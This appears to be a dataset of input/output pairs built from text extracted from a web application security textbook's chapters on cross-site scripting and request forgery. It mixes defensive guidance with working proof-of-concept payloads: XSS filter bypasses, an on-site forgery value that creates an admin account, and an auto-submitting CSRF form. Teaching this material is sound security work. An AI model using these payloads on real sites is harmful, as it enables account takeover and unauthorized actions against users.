user-controllable\ndata, and whether crafted input could be used to cause execution of arbitrary\nJavaScript. In particular, review and test any instance where your data is being\npassed to any of the following APIs:\nn document.write()\nn document.writeln()\nn document.body.innerHtml\nn eval()\nn window.execScript()\nn window.setInterval()\nn window.setTimeout()\ncc1122..iinndddd 448888 88//1199//22001111 1122::1122::3344 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 489\nChapter 12 n Attacking Users: Cross-Site Scripting 489\nTRY IT!\nhttp://mdsec.net/error/18/\nhttp://mdsec.net/error/22/\nhttp://mdsec.net/error/28/\nhttp://mdsec.net/error/31/\nhttp://mdsec.net/error/37/\nhttp://mdsec.net/error/41/\nhttp://mdsec.net/error/49/\nhttp://mdsec.net/error/53/\nhttp://mdsec.net/error/56/\nhttp://mdsec.net/error/61/\nAs with refl ected and stored XSS, the application may perform various fi ltering\nin an attempt to block attacks. Often, the fi ltering is applied on the client side,\nand you can review the validation code directly to understand how it works\nand to try to identify any bypasses. All the techniques already described for\nfi lters against refl ected XSS attacks may be relevant here.\nTRY IT!\nhttp://mdsec.net/error/92/\nhttp://mdsec.net/error/95/\nhttp://mdsec.net/error/107/\nhttp://mdsec.net/error/109/\nhttp://mdsec.net/error/118/\nIn some situations, you may fi nd that the server-side application implements\nfi lters designed to prevent DOM-based XSS attacks. Even though the vulnerable\noperation occurs on the client, and the server does not return the user-supplied\ndata in its response, the URL is still submitted to the server. So the application\nmay validate the data and fail to return the vulnerable client-side script when\na malicious payload is detected.\nIf this defense is encountered, you should attempt each of the potential fi lter\nbypasses that were described previously for refl ected XSS vulnerabilities to test\nthe robustness of the server’s validation. In addition to these attacks, several\ntechniques unique to DOM-based XSS bugs may enable your attack payload to\nevade server-side validation.\nWhen client-side scripts extract a parameter’s value from the URL, they rarely\nparse the query string properly into name/value pairs. Instead, they typically\nsearch the URL for the parameter name followed by the equals sign and then\ncc1122..iinndddd 448899 88//1199//22001111 1122::1122::3344 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 490\n490 Chapter 12 n Attacking Users: Cross-Site Scripting\nextract whatever comes next, up until the end of the URL. This behavior can\nbe exploited in two ways:\nn If the server’s validation logic is being applied on a per-parameter basis,\nrather than on the entire URL, the payload can be placed into an invented\nparameter appended after the vulnerable parameter. For example:\nhttp://mdsec.net/error/76/Error.ashx?message=Sorry%2c+an+error+occurr\ned&foo=<script>alert(1)</script>\nHere, the server ignores the invented parameter, and so it is not subject to\nany fi ltering. However, because the client-side script searches the query\nstring for message= and extracts everything following this, it includes your\npayload in the string it processes.\nn If the server’s validation logic is being applied to the entire URL, not\njust to the message parameter, it may still be possible to evade the fi lter\nby placing the payload to the right of the HTML fragment character (#):\nhttp://mdsec.net/error/82/Error.ashx?message=Sorry%2c+an+error+\noccurred#<script>alert(1)</script>\nHere, the fragment string is still part of the URL. Therefore, it is stored\nin the DOM and will be processed by the vulnerable client-side script.\nHowever, because browsers do not submit the fragment portion of the\nURL to the server, the attack string is not even sent to the server and\ntherefore cannot be blocked by any kind of server-side fi lter. Because the\nclient-side script extracts everything after message=, the payload is still\ncopied into the HTML page source.\nTRY IT!\nhttp://mdsec.net/error/76/\nhttp://mdsec.net/error/82/\nCOMMON MYTH\n“We check every user request for embedded script tags, so no XSS attacks are\npossible.”\nAside from the question of whether any fi lter bypasses are possible, you\nhave now seen three reasons why this claim can be incorrect:\nn In some XSS fl aws, the attacker-controllable data is inserted directly into\nan existing JavaScript context, so there is no need to use any script tags\nor other means of introducing script code. In other cases, you can inject\nan event handler containing JavaScript without using any script tags.\ncc1122..iinndddd 449900 88//1199//22001111 1122::1122::3344 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 491\nChapter 12 n Attacking Users: Cross-Site Scripting 491\nn If an application receives data via some out-of-band channel and renders\nthis within its web interface, any stored XSS bugs can be exploited with-\nout submitting any malicious payload using HTTP.\nn Attacks against DOM-based XSS may not involve submitting any malicious\npayload to the server. If the fragment technique is used, the payload\nremains on the client at all times.\nSome applications employ a more sophisticated client-side script that performs\nstricter parsing of the query string. For example, it may search the URL for the\nparameter name followed by the equals sign but then extract what follows only\nuntil it reaches a relevant delimiter such as & or #. In this case, the two attacks\ndescribed previously could be modifi ed as follows:\nhttp://mdsec.net/error/79/Error.ashx?foomessage=<script>alert(1)</script\n>&message=Sorry%2c+an+error+occurred\nhttp://mdsec.net/error/79/Error.ashx#message=<script>alert(1)</script>\nIn both cases, the fi rst match for message= is followed immediately by the\nattack string, without any intervening delimiter, so the payload is processed\nand copied into the HTML page source.\nTRY IT!\nhttp://mdsec.net/error/79/\nIn some cases, you may fi nd that complex processing is performed on DOM-\nbased data. Therefore, it is diffi cult to trace all the different paths taken by user-\ncontrollable data, and all the manipulation being performed, solely through static\nreview of the JavaScript source code. In this situation, it can be benefi cial to use\na JavaScript debugger to monitor the script’s execution dynamically. The FireBug\nextension to the Firefox browser is a full-fl edged debugger for client-side code\nand content. It enables you to set breakpoints and watches on interesting code\nand data, making the task of understanding a complex script considerably easier.\nCOMMON MYTH\n“We’re safe. Our web application scanner didn’t fi nd any XSS bugs.”\nAs you will see in Chapter 19, some web application scanners do a rea-\nsonable job of fi nding common fl aws, including XSS. However, it should be\nevident at this point that many XSS vulnerabilities are subtle to detect, and\ncreating a working exploit can require extensive probing and experimentation.\nAt the present time, no automated tools can reliably identify all these bugs.\ncc1122..iinndddd 449911 88//1199//22001111 1122::1122::3344 PPMM"
  },
  {
    "input": "Preventing Reflected and Stored XSS",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 492\n492 Chapter 12 n Attacking Users: Cross-Site Scripting\nPreventing XSS Attacks\nDespite the various manifestations of XSS, and the different possibilities for\nexploitation, preventing the vulnerability itself is in fact conceptually straightfor-\nward. What makes it problematic in practice is the diffi culty of identifying every\ninstance in which user-controllable data is handled in a potentially dangerous\nway. Any given page of an application may process and display dozens of items\nof user data. In addition to the core functionality, vulnerabilities may arise in\nerror messages and other locations. It is hardly surprising, therefore, that XSS\nfl aws are so hugely prevalent, even in the most security-critical applications.\nDifferent types of defense are applicable to refl ected and stored XSS on the one\nhand, and to DOM-based XSS on the other, because of their different root causes.\nPreventing Refl ected and Stored XSS\nThe root cause of both refl ected and stored XSS is that user-controllable data is\ncopied into application responses without adequate validation and sanitization.\nBecause the data is being inserted into the raw source code of an HTML page,\nmalicious data can interfere with that page, modifying not only its content but\nalso its structure — breaking out of quoted strings, opening and closing tags,\ninjecting scripts, and so on.\nTo eliminate refl ected and stored XSS vulnerabilities, the fi rst step is to iden-\ntify every instance within the application where user-controllable data is being\ncopied into responses. This includes data that is copied from the immediate\nrequest and also any stored data that originated from any user at any prior time,\nincluding via out-of-band channels. To ensure that every instance is identifi ed,\nthere is no real substitute for a close review of all application source code.\nHaving identifi ed all the operations that are potentially at risk of XSS and\nthat need to be suitably defended, you should follow a threefold approach to\nprevent any actual vulnerabilities from arising:\nn Validate input.\nn Validate output.\nn Eliminate dangerous insertion points.\nOne caveat to this approach arises where an application needs to let users\nauthor content in HTML format, such as a blogging application that allows\nHTML in comments. Some specifi c considerations relating to this situation are\ndiscussed after general defensive techniques have been described.\nValidate Input\nAt the point where the application receives user-supplied data that may be cop-\nied into one of its responses at any future point, the application should perform\ncc1122..iinndddd 449922 88//1199//22001111 1122::1122::3344 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 493\nChapter 12 n Attacking Users: Cross-Site Scripting 493\ncontext-dependent validation of this data, in as strict a manner as possible.\nPotential features to validate include the following:\nn The data is not too long.\nn The data contains only a certain permitted set of characters.\nn The data matches a particular regular expression.\nDifferent validation rules should be applied as restrictively as possible to\nnames, e-mail addresses, account numbers, and so on, according to the type of\ndata the application expects to receive in each fi eld.\nValidate Output\nAt the point where the application copies into its responses any item of data that\noriginated from some user or third party, this data should be HTML-encoded\nto sanitize potentially malicious characters. HTML encoding involves replacing\nliteral characters with their corresponding HTML entities. This ensures that\nbrowsers will handle potentially malicious characters in a safe way, treating\nthem as part of the content of the HTML document and not part of its structure.\nThe HTML encodings of the primary problematic characters are as follows:\nn “ —&quot;\nn ‘ —&apos;\nn & —&amp;\nn < —&lt;\nn > —&gt;\nIn addition to these common encodings, any character can be HTML-encoded\nusing its numeric ASCII character code, as follows:\nn % —&#37;\nn * —&#42;\nIt should be noted that when inserting user input into a tag attribute value, the\nbrowser HTML-decodes the value before processing it further. In this situation,\nthe defense of simply HTML-encoding any normally problematic characters may\nbe ineffective. Indeed, as we have seen, for some fi lters the attacker can bypass\nHTML-encoding characters in the payload herself. For example:\n<img src=”javascript&#58;alert(document.cookie)”>\n<img src=”image.gif” onload=”alert(&apos;xss&apos;)”>\nAs described in the following section, it is preferable to avoid inserting user-\ncontrollable data into these locations. If this is considered unavoidable for some\nreason, great care needs to be taken to prevent any fi lter bypasses. For example,\ncc1122..iinndddd 449933 88//1199//22001111 1122::1122::3355 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 494\n494 Chapter 12 n Attacking Users: Cross-Site Scripting\nif user data is inserted into a quoted JavaScript string in an event handler, any\nquotation marks or backslashes in user input should be properly escaped with\nbackslashes, and the HTML encoding should include the & and ; characters to\nprevent an attacker from performing his own HTML encoding.\nASP.NET applications can use the Server.HTMLEncode API to sanitize com-\nmon malicious characters within a user-controllable string before this is copied\ninto the server’s response. This API converts the characters “&< and > into their\ncorresponding HTML entities and also converts any ASCII character above 0x7f\nusing the numeric form of encoding.\nThe Java platform has no equivalent built-in API; however, it is easy to con-\nstruct your own equivalent method using just the numeric form of encoding.\nFor example:\npublic static String HTMLEncode(String s)\n{\nStringBuffer out = new StringBuffer();\nfor (int i = 0; i < s.length(); i++)\n{\nchar c = s.charAt(i);\nif(c > 0x7f || c==’”’ || c==’&’ || c==’<’ || c==’>’)\nout.append(“&#” + (int) c + “;”);\nelse out.append(c);\n}\nreturn out.toString();\n}\nA common mistake developers make is to HTML-encode only the characters\nthat immediately appear to be of use to an attacker in the specifi c context. For\nexample, if an item is being inserted into a double-quoted string, the applica-\ntion might encode only the “ character. If the item is being inserted unquoted\ninto a tag, it might encode only the > character. This approach considerably\nincreases the risk of bypasses being found. As you have seen, an attacker can\noften exploit browsers’ tolerance of invalid HTML and JavaScript to change\ncontext or inject code in unexpected ways. Furthermore, it is often possible to\nspan an attack across multiple controllable fi elds, exploiting the different fi ltering\nbeing employed in each one. A far more robust approach is to always HTML-\nencode every character that may be of potential use to an attacker, regardless\nof the context where it is being inserted. To provide the highest possible level\nof assurance, developers may elect to HTML-encode every nonalphanumeric\ncharacter, including whitespace. This approach normally imposes no measur-\nable overhead on the application and presents a severe obstacle to any kind of\nfi lter bypass attack.\nThe reason for combining input validation and output sanitization is that this\ninvolves two layers of defenses, either one of which provides some protection\nif the other one fails. As you have seen, many fi lters that perform input and\ncc1122..iinndddd 449944 88//1199//22001111 1122::1122::3355 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 495\nChapter 12 n Attacking Users: Cross-Site Scripting 495\noutput validation are subject to bypasses. By employing both techniques, the\napplication gains some additional assurance that an attacker will be defeated\neven if one of its two fi lters is found to be defective. Of the two defenses, the\noutput validation is the most important and is mandatory. Performing strict\ninput validation should be viewed as a secondary failover.\nOf course, when devising the input and output validation logic itself, great\ncare should be taken to avoid any vulnerabilities that lead to bypasses. In par-\nticular, fi ltering and encoding should be carried out after any relevant canoni-\ncalization, and the data should not be further canonicalized afterwards. The\napplication should also ensure that the presence of any NULL bytes does not\ninterfere with its validation.\nEliminate Dangerous Insertion Points\nThere are some locations within the application page where it is just too inher-\nently dangerous to insert user-supplied input, and developers should look for\nan alternative means of implementing the desired functionality.\nInserting user-controllable data directly into existing script code should be\navoided wherever possible. This applies to code within <script> tags, and also\ncode within event handlers. When applications attempt to do this safely, it is\nfrequently possible to bypass their defensive fi lters. And once an attacker has\ntaken control of the context of the data he controls, he typically needs to per-\nform minimal work to inject arbitrary script commands and therefore perform\nmalicious actions.\nWhere a tag attribute may take a URL as its value, applications should gener-\nally avoid embedding user input, because various techniques may be used to\nintroduce script code, including the use of scripting pseudo-protocols.\nA further pitfall to avoid is situations where an attacker can manipulate the\ncharacter set of the application’s response, either by injecting into a relevant\ndirective or because the application uses a request parameter to specify the\npreferred character set. In this situation, input and output fi lters that are well\ndesigned in other respects may fail because the attacker’s input is encoded\nin an unusual form that the fi lters do not recognize as potentially malicious.\nWherever possible, the application should explicitly specify an encoding type\nin its response headers, disallow any means of modifying this, and ensure that\nits XSS fi lters are compatible with it. For example:\nContent-Type: text/html; charset=ISO-8859-1\nAllowing Limited HTML\nSome applications need to let users submit data in HTML format that will be\ninserted into application responses. For example, a blogging application may\ncc1122..iinndddd 449955 88//1199//22001111 1122::1122::3355 PPMM"
  },
  {
    "input": "Preventing DOM-Based XSS",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 496\n496 Chapter 12 n Attacking Users: Cross-Site Scripting\nallow users to write comments using HTML, to apply formatting to their com-\nments, embed links or images, and so on. In this situation, applying the preceding\nmeasures across the board will break the application. Users’ HTML markup will\nitself be HTML-encoded in responses and therefore will be displayed on-screen\nas actual markup, rather than as the formatted content that is required.\nFor an application to support this functionality securely, it needs to be robust\nin allowing only a limited subset of HTML, which does not provide any means\nof introducing script code. This must involve a whitelist approach in which only\nspecifi c tags and attributes are permitted. Doing this successfully is a nontrivial\ntask because, as you have seen, there are numerous ways to use seemingly\nharmless tags to execute code.\nFor example, if the application allows the <b> and <i> tags and does not\nconsider any attributes used with these tasks, the following attacks may be\npossible:\n<b style=behavior:url(#default#time2) onbegin=alert(1)>\n<i onclick=alert(1)>Click here</i>\nFurthermore, if the application allows the apparently safe combination of the\n<a> tag with the href attribute, the following attack may work:\n<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”>Cl\nick here</a>\nVarious frameworks are available to validate user-supplied HTML markup\nto try to ensure that it does not contain any means of executing JavaScript, such\nas the OWASP AntiSamy project. It is recommended that developers who need\nto allow users to author limited HTML should either use a suitable mature\nframework directly or should closely examine one of them to understand the\nvarious challenges involved.\nAn alternative approach is to make use of a custom intermediate markup\nlanguage. Users are permitted to use the limited syntax of the intermediate\nlanguage, which the application then processes to generate the corresponding\nHTML markup.\nPreventing DOM-Based XSS\nThe defenses described so far obviously do not apply directly to DOM-based\nXSS, because the vulnerability does not involve user-controlled data being\ncopied into server responses.\nWherever possible, applications should avoid using client-side scripts to\nprocess DOM data and insert it into the page. Because the data being processed\nis outside of the server’s direct control, and in some cases even outside of its\nvisibility, this behavior is inherently risky.\ncc1122..iinndddd 449966 88//1199//22001111 1122::1122::3355 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 497\nChapter 12 n Attacking Users: Cross-Site Scripting 497\nIf it is considered unavoidable to use client-side scripts in this way, DOM-based\nXSS fl aws can be prevented through two types of defenses, corresponding to\nthe input and output validation described for refl ected XSS.\nValidate Input\nIn many situations, applications can perform rigorous validation on the data being\nprocessed. Indeed, this is one area where client-side validation can be more effec-\ntive than server-side validation. In the vulnerable example described earlier, the\nattack can be prevented by validating that the data about to be inserted into the\ndocument contains only alphanumeric characters and whitespace. For example:\n<script>\nvar a = document.URL;\na = a.substring(a.indexOf(“message=”) + 8, a.length);\na = unescape(a);\nvar regex=/^([A-Za-z0-9+\\s])*$/;\nif (regex.test(a))\ndocument.write(a);\n</script>\nIn addition to this client-side control, rigorous server-side validation of URL\ndata can be employed as a defense-in-depth measure to detect requests that may\ncontain malicious exploits for DOM-based XSS fl aws. In the same example just\ndescribed, it would actually be possible for an application to prevent an attack\nby employing only server-side data validation by verifying the following:\nn The query string contains a single parameter.\nn The parameter’s name is message (case-sensitive check).\nn The parameter’s value contains only alphanumeric content.\nWith these controls in place, it would still be necessary for the client-side\nscript to parse the value of the message parameter properly, ensuring that any\nfragment portion of the URL was not included.\nValidate Output\nAs with refl ected XSS fl aws, applications can perform HTML encoding of user-\ncontrollable DOM data before it is inserted into the document. This enables\nall kinds of potentially dangerous characters and expressions to be displayed\nwithin the page in a safe way. HTML encoding can be implemented in client-\nside JavaScript with a function like the following:\nfunction sanitize(str)\n{\ncc1122..iinndddd 449977 88//1199//22001111 1122::1122::3366 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 498\n498 Chapter 12 n Attacking Users: Cross-Site Scripting\nvar d = document.createElement(‘div’);\nd.appendChild(document.createTextNode(str));\nreturn d.innerHTML;\n}\nSummary\nThis chapter has examined the various ways in which XSS vulnerabilities can\narise and ways in which common fi lter-based defenses can be circumvented.\nBecause XSS vulnerabilities are so prevalent, it is often straightforward to fi nd\nseveral bugs within an application that are easy to exploit. XSS becomes more\ninteresting, from a research perspective at least, when various defenses are in\nplace that force you to devise some highly crafted input, or leverage some little-\nknown feature of HTML, JavaScript, or VBScript, to deliver a working exploit.\nThe next chapter builds on this foundation and examines a wide variety of\nfurther ways in which defects in the server-side web application may leave its\nusers exposed to malicious attacks.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. What standard “signature” in an application’s behavior can be used to\nidentify most instances of XSS vulnerabilities?\n2. You discover a refl ected XSS vulnerability within the unauthenticated\narea of an application’s functionality. State two different ways in which\nthe vulnerability could be used to compromise an authenticated session\nwithin the application.\n3. You discover that the contents of a cookie parameter are copied without\nany fi lters or sanitization into the application’s response. Can this behav-\nior be used to inject arbitrary JavaScript into the returned page? Can it be\nexploited to perform an XSS attack against another user?\n4. You discover stored XSS behavior within data that is only ever displayed\nback to yourself. Does this behavior have any security signifi cance?\n5. You are attacking a web mail application that handles fi le attachments\nand displays these in-browser. What common vulnerability should you\nimmediately check for?\n6. How does the same-origin policy impinge upon the use of the Ajax tech-\nnologyXMLHttpRequest?\ncc1122..iinndddd 449988 88//1199//22001111 1122::1122::3366 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 499\nChapter 12 n Attacking Users: Cross-Site Scripting 499\n7. Name three possible attack payloads for XSS exploits (that is, the mali-\ncious actions that you can perform within another user’s browser, not the\nmethods by which you deliver the attacks).\n8. You have discovered a refl ected XSS vulnerability where you can inject\narbitrary data into a single location within the HTML of the returned\npage. The data inserted is truncated to 50 bytes, but you want to inject a\nlengthy script. You prefer not to call out to a script on an external server.\nHow can you work around the length limit?\n9. You discover a refl ected XSS fl aw in a request that must use the POST\nmethod. What delivery mechanisms are feasible for performing an attack?\ncc1122..iinndddd 449999 88//1199//22001111 1122::1122::3366 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 500\ncc1122..iinndddd 550000 88//1199//22001111 1122::1122::3366 PPMM"
  },
  {
    "input": "Inducing User Actions",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 501\nCHAPTER\n13\nAttacking Users: Other\nTechniques\nThe preceding chapter examined the grandfather of attacks against other appli-\ncation users—cross-site scripting (XSS). This chapter describes a wide range of\nother attacks against users. Some of these have important similarities to XSS\nattacks. In many cases, the attacks are more complex or subtle than XSS attacks\nand can succeed in situations where plain XSS is not possible.\nAttacks against other application users come in many forms and manifest a\nvariety of subtleties and nuances that are frequently overlooked. They are also\nless well understood in general than the primary server-side attacks, with dif-\nferent fl aws being confl ated or neglected even by some seasoned penetration\ntesters. We will describe all the different vulnerabilities that are commonly\nencountered and will spell out the steps you need to follow to identify and\nexploit each of these.\nInducing User Actions\nThe preceding chapter described how XSS attacks can be used to induce a\nuser to unwittingly perform actions within the application. Where the victim\nuser has administrative privileges, this technique can quickly lead to complete\ncompromise of the application. This section examines some additional methods\nthat can be used to induce actions by other users. These methods can be used\neven in applications that are secured against XSS.\n501\ncc1133..iinndddd 550011 88//1199//22001111 1122::1133::5577 PPMM"
  },
  {
    "input": "Request Forgery",
    "output": "Stuttard c13.indd V4 - 08/17/2011 Page 502\n502 Chapter 13 n Attacking Users: Other Techniques\nRequest Forgery\nThis category of attack (also known as sessionriding) is closely related to ses-\nsion hijacking attacks, in which an attacker captures a user’s session token and\ntherefore can use the application “as” that user. With request forgery, however,\nthe attacker need never actually know the victim’s session token. Rather, the\nattacker exploits the normal behavior of web browsers to hijack a user’s token,\ncausing it to be used to make requests that the user does not intend to make.\nRequest forgery vulnerabilities come in two fl avors: on-site and cross-site.\nOn-Site Request Forgery\nOn-site request forgery (OSRF) is a familiar attack payload for exploiting stored\nXSS vulnerabilities. In the MySpace worm, described in the preceding chapter,\na user named Samy placed a script in his profi le that caused any user viewing\nthe profi le to perform various unwitting actions. What is often overlooked is\nthat stored OSRF vulnerabilities can exist even in situations where XSS is not\npossible.\nConsider a message board application that lets users submit items that are\nviewed by other users. Messages are submitted using a request like the following:\nPOST /submit.php\nHost: wahh-app.com\nContent-Length: 34\ntype=question&name=daf&message=foo\nThis request results in the following being added to the messages page:\n<tr>\n<td><img src=”/images/question.gif”></td>\n<td>daf</td>\n<td>foo</td>\n</tr>\nIn this situation, you would, of course, test for XSS fl aws. However, suppose\nthat the application is properly HTML-encoding any “< and > characters it inserts\ninto the page. When you are satisfi ed that this defense cannot be bypassed in\nany way, you might move on to the next test.\nBut look again. You control part of the target of the <img> tag. Although you\ncannot break out of the quoted string, you can modify the URL to cause any user\nwho views your message to make an arbitrary on-site GET request. For example,\nsubmitting the following value in the type parameter causes anyone viewing\nyour message to make a request that attempts to add a new administrative user:\n../admin/newUser.php?username=daf2&password=0wned&role=admin#\ncc1133..iinndddd 550022 88//1199//22001111 1122::1133::5577 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 503\nChapter 13 n Attacking Users: Other Techniques 503\nWhen an ordinary user is induced to issue your crafted request, it, of course,\nfails. But when an administrator views your message, your backdoor account\ngets created. You have performed a successful OSRF attack even though XSS\nwas not possible. And, of course, the attack succeeds even if administrators take\nthe precaution of disabling JavaScript.\nIn the preceding attack string, note the # character that effectively terminates\nthe URL before the .gif suffi x. You could just as easily use & to incorporate the\nsuffi x as a further request parameter.\nTRY IT!\nIn this example, an OSRF exploit can be placed in the recent searches list,\neven though this is not vulnerable to XSS:\nhttp://mdsec.net/search/77/\nHACK STEPS\n1. In every location where data submitted by one user is displayed to other\nusers but you cannot perform a stored XSS attack, review whether the\napplication’s behavior leaves it vulnerable to OSRF.\n2. The vulnerability typically arises where user-supplied data is inserted into\nthe target of a hyperlink or other URL within the returned page. Unless the\napplication specifically blocks any characters you require (typically dots,\nslashes, and the delimiters used in the query string), it is almost certainly\nvulnerable.\n3. If you discover an OSRF vulnerability, look for a suitable request to tar-\nget in your exploit, as described in the next section for cross-site request\nforgery.\nOSRF vulnerabilities can be prevented by validating user input as strictly as\npossible before it is incorporated into responses. For example, in the specifi c\ncase described, the application could verify that the type parameter has one\nof a specifi c range of values. If the application must accept other values that it\ncannot anticipate in advance, input containing any of the characters /.\\?&\nand = should be blocked.\nNote that HTML-encoding these characters is not an effective defense against\nOSRF attacks, because browsers will decode the target URL string before it is\nrequested.\nDepending on the insertion point and the surrounding context, it may also\nbe possible to prevent OSRF attacks using the same defenses described in the\nnext section for cross-site request forgery attacks.\ncc1133..iinndddd 550033 88//1199//22001111 1122::1133::5577 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 504\n504 Chapter 13 n Attacking Users: Other Techniques\nCross-Site Request Forgery\nIn cross-site request forgery (CSRF) attacks, the attacker creates an innocuous-\nlooking website that causes the user’s browser to submit a request directly to\nthe vulnerable application to perform some unintended action that is benefi cial\nto the attacker.\nRecall that the same-origin policy does not prohibit one website from issuing\nrequests to a different domain. It does, however, prevent the originating website\nfrom processing the responses to cross-domain requests. Hence, CSRF attacks\nnormally are “one-way” only. Multistage actions such as those involved in the\nSamy XSS worm, in which data is read from responses and incorporated into\nlater requests, cannot be performed using a pure CSRF attack. (Some methods\nby which CSRF techniques can be extended to perform limited two-way attacks,\nand capture data cross-domain, are described later in this chapter.)\nConsider an application in which administrators can create new user accounts\nusing requests like the following:\nPOST /auth/390/NewUserStep2.ashx HTTP/1.1\nHost: mdsec.net\nCookie: SessionId=8299BE6B260193DA076383A2385B07B9\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 83\nrealname=daf&username=daf&userrole=admin&password=letmein1&\nconfirmpassword=letmein1\nThis request has three key features that make it vulnerable to CSRF attacks:\nn The request performs a privileged action. In the example shown, the\nrequest creates a new user with administrative privileges.\nn The application relies solely on HTTP cookies for tracking sessions. No\nsession-related tokens are transmitted elsewhere within the request.\nn The attacker can determine all the parameters required to perform the\naction. Aside from the session token in the cookie, no unpredictable values\nneed to be included in the request.\nTaken together, these features mean that an attacker can construct a web\npage that makes a cross-domain request to the vulnerable application contain-\ning everything needed to perform the privileged action. Here is an example of\nsuch an attack:\n<html>\n<body>\n<form action=”https://mdsec.net/auth/390/NewUserStep2.ashx”\nmethod=”POST”>\ncc1133..iinndddd 550044 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 505\nChapter 13 n Attacking Users: Other Techniques 505\n<input type=”hidden” name=”realname” value=”daf”>\n<input type=”hidden” name=”username” value=”daf”>\n<input type=”hidden” name=”userrole” value=”admin”>\n<input type=”hidden” name=”password” value=”letmein1”>\n<input type=”hidden” name=”confirmpassword” value=”letmein1”>\n</form>\n<script>\ndocument.forms[0].submit();\n</script>\n</body>\n</html>\nThis attack places all the parameters to the request into hidden form fi elds\nand contains a script to automatically submit the form. When the user’s browser\nsubmits the form, it automatically adds the user’s cookies for the target domain,\nand the application processes the resulting request in the usual way. If an admin-\nistrative user who is logged in to the vulnerable application visits the attacker’s\nweb page containing this form, the request is processed within the administra-\ntor’s session, and the attacker’s account is created.\nTRY IT!\nhttp://mdsec.net/auth/390/\nA real-world example of a CSRF fl aw was found in the eBay application by\nDave Armstrong in 2004. It was possible to craft a URL that caused the requesting\nuser to make an arbitrary bid on an auction item. A third-party website could\ncause visitors to request this URL, so that any eBay user who visited the website\nwould place a bid. Furthermore, with a little work, it was possible to exploit the\nvulnerability in a stored OSRF attack within the eBay application itself. The\napplication allowed users to place <img> tags within auction descriptions. To\ndefend against attacks, the application validated that the tag’s target returned\nan actual image fi le. However, it was possible to place a link to an off-site server\nthat returned a legitimate image when the auction item was created and sub-\nsequently replace this image with an HTTP redirect to the crafted CSRF URL.\nThus, anyone who viewed the auction item would unwittingly place a bid on\nit. More details can be found in the original Bugtraq post:\nhttp://archive.cert.uni-stuttgart.de/bugtraq/2005/04/msg00279.html\nNOTE The defect in the application’s validation of off-site images is known\nas a “time of check, time of use” (TOCTOU) fl aw. An item is validated at one\ntime and used at another time, and an attacker can modify its value in the\nwindow between these times.\ncc1133..iinndddd 550055 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 506\n506 Chapter 13 n Attacking Users: Other Techniques\nExploiting CSRF Flaws\nCSRF vulnerabilities arise primarily in cases where applications rely solely on\nHTTP cookies for tracking sessions. Once an application has set a cookie in a\nuser’s browser, the browser automatically submits that cookie to the application\nin every subsequent request. This is true regardless of whether the request origi-\nnates from a link, form within the application itself, or from any other source\nsuch as an external website or a link clicked in an e-mail. If the application does\nnot take precautions against an attacker’s “riding” on its users’ sessions in this\nway, it is vulnerable to CSRF.\nHACK STEPS\n1. Review the key functionality within the application, as identified in your\napplication mapping exercises (see Chapter 4).\n2. Find an application function that can be used to perform some sensi-\ntive action on behalf of an unwitting user, that relies solely on cookies\nfor tracking user sessions, and that employs request parameters that an\nattacker can fully determine in advance—that is, that do not contain any\nother tokens or unpredictable items.\n3. Create an HTML page that issues the desired request without any user\ninteraction. For GET requests, you can place an <img> tag with the src\nattribute set to the vulnerable URL. For POST requests, you can create a\nform that contains hidden fields for all the relevant parameters required\nfor the attack and that has its target set to the vulnerable URL. You can\nuse JavaScript to autosubmit the form as soon as the page loads.\n4. While logged in to the application, use the same browser to load your\ncrafted HTML page. Verify that the desired action is carried out within the\napplication.\nTIP The possibility of CSRF attacks alters the impact of numerous other\ncategories of vulnerability by introducing an additional vector for their exploi-\ntation. For example, consider an administrative function that takes a user\nidentifi er in a parameter and displays information about the specifi ed user.\nThe function is subject to rigorous access control, but it contains a SQL injec-\ntion vulnerability in the uid parameter. Since application administrators are\ntrusted and have full control of the database in any case, the SQL injection\nvulnerability might be considered low risk. However, because the function\ndoes not (as originally intended) perform any administrative action, it is not\nprotected against CSRF. From an attacker’s perspective, the function is just as\ncc1133..iinndddd 550066 88//1199//22001111 1122::1133::5588 PPMM\nStuttard c13.indd V4 - 08/17/2011 Page 507\nChapter 13 n Attacking Users: Other Techniques 507\nsignifi cant as one specifi cally designed for administrators to execute arbitrary\nSQL queries. If a query can be injected that performs some sensitive action,\nor that retrieves data via some out-of-band channel, this attack can be per-\nformed by nonadministrative users via CSRF.\nAuthentication and CSRF\nSince CSRF attacks involve performing some privileged action within the context\nof the victim user’s session, they normally require the user to be logged in to\nthe application at the time of the attack.\nOne location where numerous dangerous CSRF vulnerabilities have arisen\nis in the web interfaces used by home DSL routers. These devices often contain\nsensitive functions, such as the ability to open all ports on the Internet-facing\nfi rewall. Since these functions are often not protected against CSRF, and since\nmost users do not modify the device’s default internal IP address, they are\nvulnerable to CSRF attacks delivered by malicious external sites. However, the\ndevices concerned often require authentication to make sensitive changes, and\nmost users generally are not logged in to their device.\nIf the device’s web interface uses forms-based authentication, it is often possible\nto perform a two-stage attack by fi rst logging the user in to the device and then\nperforming the authenticated action. Since most users do not modify the default\ncredentials for devices of this kind (perhaps on the assumption that the web\ninterface can be accessed only from the internal home network), the attacker’s\nweb page can fi rst issue a login request containing default credentials. The device\nthen sets a session token in the user’s browser, which is sent automatically in\nany subsequent requests, including those generated by the attacker.\nIn other situations, an attacker may require that the victim user be logged\nin to the application under the attacker’s own user context to deliver a specifi c\nattack. For example, consider an application that allows users to upload and store\nfi les. These fi les can be downloaded later, but only by the user who 